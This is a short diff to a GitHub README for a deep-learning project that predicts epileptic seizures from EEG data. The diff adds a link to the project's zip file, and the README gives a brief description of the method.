@@ -1,6 +1,6 @@
 <h1>Epileptic-Seizure-Prediction</h1>
 
- ### [Project Fles]()
+ ### [Project Fles](https://github.com/karnanijr1001/Epileptic-Seizure-Prediction/blob/main/676869project.zip)
 
 <h2>Description</h2>
 Project consists of a simple Python script that walks the user through amd how a deep learning approach has been used to detect epileptic seizures. It can successfully differentiate between the normal and seizure state of EEG. It can gain useful information out of noise which may be present in the data. The results prove the superiority of the proposed method over traditional methods.<br />
